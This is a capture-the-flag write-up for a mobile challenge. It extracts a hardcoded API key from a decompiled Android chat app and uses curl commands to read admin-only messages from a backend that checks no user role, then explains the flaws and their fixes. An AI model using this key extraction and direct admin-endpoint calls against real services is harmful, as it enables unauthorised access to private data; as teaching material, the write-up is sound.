text
# Challenge - Whispers in the Wire 

- Category: Mobile  
- Difficulty: Easy  

This challenge revolves around a mobile chat app that talks to a backend using a **hardcoded shared API key** and relies on a purely client-side “admin” flag, while the server never performs real authorization.

---

## 1. Challenge Overview

The files provided include:

- A decompiled Android app, **WhisperChat**.
- A Python desktop client script.

WhisperChat is a simple chat client:

- It sends and receives messages via a REST API.
- It uses a shared API key embedded in the app.
- It has an “admin console” UI that is shown or hidden based on a client-side `isAdmin()` flag.

The critical point: the backend only checks for the **presence of the shared API key**, not the user’s role. So once you extract the key from the APK/source, you can call the admin endpoint directly and read private staff messages, one of which contains the flag.

---

## 2. Code Recon and API Key Discovery

From the Android resources (e.g., `res/values/strings.xml`), you find:

```xml
<string name="api_base_url">https://api.whisperchat.internal</string>
<string name="api_key">fluidctf-api-2026-whispers</string>
```

This shows that:

- The API base URL is hardcoded.
- The API key `fluidctf-api-2026-whispers` is compiled into every client.

In the Java sources, the Retrofit client attaches this key on every request:

```java
Interceptor authInterceptor = chain -> {
    Request.Builder builder = chain.request().newBuilder();
    builder.addHeader("X-API-Key", BuildConfig.API_KEY);
    builder.addHeader("User-Agent", "WhisperChat/1.4.2 (Android 14; SDK 34)");
    return chain.proceed(builder.build());
};
```

The API interface:

```java
public interface WhisperApi {
    @GET("api/messages")
    Call<MessageList> getMessages(@Query("recipient") String recipient);

    @POST("api/messages")
    Call<Message> sendMessage(@Body Message message);

    @GET("api/admin/messages")
    Call<MessageList> getAdminMessages();  // "every channel, including private staff threads"
}
```

The Python desktop client confirms the same design:

```python
API_KEY = "fluidctf-api-2026-whispers"
HEADERS = {
    "X-API-Key": API_KEY,
    "User-Agent": "WhisperChat/1.4.2 (Android 14; SDK 34)"
}
```

So the **same shared API key** is used by Android and desktop clients. There is no concept of per-user authentication; possession of this key is treated as “being a valid client.”

---

## 3. Client-Side Only “Admin” Flag

The session model:

```java
public class Session {
    // The isAdmin() flag only toggles UI; the server does not consult it,
    // which is the whole problem.
    private boolean admin = false;

    public boolean isAdmin() { return admin; }
}
```

And in the settings UI:

```java
if (session.isAdmin()) {
    adminConsoleEntry.setVisibility(View.VISIBLE);
} else {
    adminConsoleEntry.setVisibility(View.GONE);
}
```

This means:

- The **admin console** is hidden or shown **only in the UI**.
- The backend does not know or care about `isAdmin()`.
- The admin API route `/api/admin/messages` is exposed and only protected by the shared API key.

This is classic “security by client-side flag” — which is not security at all.

---

## 4. My Exploit Script

Once the API key and headers are known, you don’t need the app; you can talk to the backend directly.

I used this minimal script:

```bash
HOST='tu host aqui'
API_KEY='fluidctf-api-2026-whispers'
UA='WhisperChat/1.4.2 (Android 14; SDK 34)'

curl -sk "$HOST/api/admin/messages" \
  -H "X-API-Key: $API_KEY" \
  -H "Content-Type: application/json" \
  -H "User-Agent: $UA" \
| jq .
```

### What It Does

- `HOST` is the challenge instance base URL (set it to the host you get in the CTF).
- `API_KEY` is the hardcoded key extracted from the app.
- `User-Agent` mimics the mobile client string.
- The request:

  - Uses `GET /api/admin/messages`.
  - Sends `X-API-Key: fluidctf-api-2026-whispers`.
  - Gets back the admin message feed as JSON.

Among the returned messages, one is a private admin/ops or staff message whose `body` field contains the flag.

Because the server only checks the API key and **does not enforce any user identity or role**, this works even though we are not actually logged in as an admin and have never passed any credentials.

---

## 5. Vulnerability Analysis

### CWE-798 — Hardcoded Credentials

- The API key is embedded in:

  - Android `strings.xml`.
  - Python client source.

- Anyone with access to the APK (which is public in a real deployment) can extract this key using common tooling (e.g., apktool, jadx, or simply unpacking resources).
- Once the key is known, the attacker can impersonate any client and hit all endpoints that only require `X-API-Key`.

The key is **shared** and long-lived, which makes it even worse.

### CWE-284 — Improper Access Control

The backend behavior:

- Normal messages endpoint: `/api/messages`.
- Admin messages endpoint: `/api/admin/messages`.

Both are gated only by the presence of `X-API-Key`:

- No per-user session token.
- No role checks.
- No distinction between normal and admin users.

The “admin console” is merely hidden in the client UI; the actual **admin data** is freely served to anyone with the key. This is broken access control:

- Admin-only data is exposed via a public, guessable endpoint.
- Authorization is effectively “has the hardcoded key” — which every user/client has.

The vulnerability is especially clear because the source comments explicitly state that `/api/admin/messages` returns “every channel, including private staff threads.”

---

## 6. Exploitation Flow (Conceptual)

1. **Extract the API key** from the APK or Python client.
2. **Confirm the key** by calling `/api/messages` with:

   ```bash
   curl -s -H "X-API-Key: fluidctf-api-2026-whispers" \
        -H "User-Agent: WhisperChat/1.4.2 (Android 14; SDK 34)" \
        "$HOST/api/messages"
   ```

   You should see regular chat messages, confirming the key is valid.

3. **Call the admin endpoint**:

   ```bash
   curl -s -H "X-API-Key: fluidctf-api-2026-whispers" \
        -H "User-Agent: WhisperChat/1.4.2 (Android 14; SDK 34)" \
        "$HOST/api/admin/messages"
   ```

4. **Read the JSON response**:

   - Look for a message with fields like:

     - `sender: "admin"` or similar.
     - `private: true`.
     - `body` containing the flag.

5. Extract the flag from that message body.

No admin login, no UI interaction, no role elevation — just a direct HTTP call with the leaked key.

---

## 7. Lessons Learned & Remediation

### What Went Wrong

- A single, hardcoded API key is treated as global authentication.
- Admin-only data is exposed at a separate endpoint but protected only by that same shared key.
- Admin “status” is implemented only as a client-side flag that toggles UI elements.
- There is no server-side notion of user identity or role.

### How to Fix It

- **Per-user authentication**:
  - Use proper login with per-user credentials.
  - Issue short-lived tokens (e.g., JWT) tied to a user identity.
- **Server-side authorization**:
  - Enforce role checks on `/api/admin/messages`.
  - Only users whose token claims include `role: admin` should get admin messages.
- **Avoid hardcoded secrets in clients**:
  - If an API key is needed, treat it as a secret and keep it on the server side.
  - Use public client IDs and server-issued tokens rather than embedding long-term secrets.
- **Client-side flags are not security controls**:
  - UI toggles like `isAdmin()` are for UX only.
  - All sensitive decisions must be made on the server, based on trusted data.

Whispers in the Wire is a good reminder that **mobile apps are just clients**; any secret you ship in them should be assumed readable, and all real security must be enforced by the backend.  
